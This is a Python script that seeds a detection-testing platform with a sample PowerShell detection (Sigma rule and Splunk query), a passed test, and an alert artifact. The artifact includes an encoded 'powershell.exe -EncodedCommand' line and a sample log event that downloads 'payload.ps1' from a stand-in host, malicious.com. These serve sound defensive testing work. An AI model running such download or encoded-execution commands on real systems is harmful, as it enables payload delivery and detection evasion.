"""
Script to create a sample detection with a sample alert for testing.
Run this after the backend is started to populate sample data.
"""
import asyncio
import sys
import os

# Add the backend directory to the path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app.db import async_sessionmaker, async_engine
from app import models
from app.security import hash_password
from datetime import datetime, timedelta
import uuid


async def seed_sample_data():
    """Create a sample detection with a sample test and alert."""
    async with async_sessionmaker() as session:
        # Ensure we're using the session correctly
        try:
            # 1. Get or create admin user
            from sqlalchemy.future import select
            result = await session.execute(
                select(models.User).where(models.User.email == "admin@purvex.local")
            )
            admin = result.scalars().first()
            
            if not admin:
                print("[WARNING] Admin user not found. Please ensure the backend has created the default admin.")
                return

            # 2. Create a sample detection
            sample_detection = models.Detection(
                id=str(uuid.uuid4()),
                technique_id="T1059.001",
                title="Suspicious PowerShell Execution",
                description="Detects suspicious PowerShell execution patterns commonly used in attacks, including base64 encoded commands and execution policy bypasses.",
                sigma_rule="""
title: Suspicious PowerShell Execution
id: abc123-def456-ghi789
status: experimental
description: Detects suspicious PowerShell execution patterns
references:
    - https://attack.mitre.org/techniques/T1059/001/
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    product: windows
    service: powershell
detection:
    selection:
        EventID: 4104
        ScriptBlockText|contains:
            - '-EncodedCommand'
            - '-ExecutionPolicy Bypass'
            - 'Invoke-Expression'
    condition: selection
falsepositives:
    - Legitimate automation scripts
level: high
""",
                siem_type="splunk",
                siem_query='index=windows EventCode=4104 (ScriptBlockText="*EncodedCommand*" OR ScriptBlockText="*ExecutionPolicy Bypass*" OR ScriptBlockText="*Invoke-Expression*") | stats count by host, user, ScriptBlockText',
                status="ACTIVE",
                owner="admin@purvex.local",
                created_at=datetime.utcnow() - timedelta(days=7),
                last_updated_at=datetime.utcnow() - timedelta(days=1),
            )
            
            session.add(sample_detection)
            await session.flush()  # Get the ID
            
            # 3. Create a sample test that PASSED
            sample_test = models.Test(
                detection_id=sample_detection.id,
                technique_id=sample_detection.technique_id,
                marker="purvex_test_20250123_123456",
                environment="lab",
                status="completed",
                result="PASS",
                score=85,
                started_at=datetime.utcnow() - timedelta(hours=2),
                finished_at=datetime.utcnow() - timedelta(hours=1),
            )
            
            session.add(sample_test)
            await session.flush()
            
            # 4. Create a test artifact with sample alert data
            sample_artifact = models.TestArtifact(
                test_id=sample_test.id,
                atomic_command='powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==',
                siem_sample_events='''{
  "EventCode": 4104,
  "host": "LAB-DC01",
  "user": "SYSTEM",
  "ScriptBlockText": "Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\\\\temp\\\\payload.ps1",
  "timestamp": "2025-01-23T10:30:00Z"
}''',
                ai_explanation="Detection successfully fired on suspicious PowerShell execution with encoded command. Telemetry was present and the rule logic correctly identified the attack pattern.",
                ai_root_cause_category="NONE",
                ai_confidence_score=95,
            )
            
            session.add(sample_artifact)
            
            # 5. Update detection lifecycle fields
            sample_detection.last_tested_at = sample_test.finished_at
            sample_detection.last_pass_at = sample_test.finished_at
            sample_detection.last_alert_at = sample_test.finished_at
            
            await session.commit()
            await session.refresh(sample_detection)
            await session.refresh(sample_test)
            
            # Access attributes after refresh
            det_title = sample_detection.title
            det_id = sample_detection.id
            test_id = sample_test.id
            test_result = sample_test.result
            
            print(f"[OK] Created sample detection: {det_title} (ID: {det_id})")
            print(f"[OK] Created sample test: Test #{test_id} - {test_result}")
            print(f"[OK] Created sample artifact with alert data")
            print(f"\nYou can now view this detection in the UI and test the Watchtower AI assistant!")
            
        except Exception as e:
            await session.rollback()
            print(f"[ERROR] Error creating sample data: {e}")
            import traceback
            traceback.print_exc()
            raise


if __name__ == "__main__":
    asyncio.run(seed_sample_data())

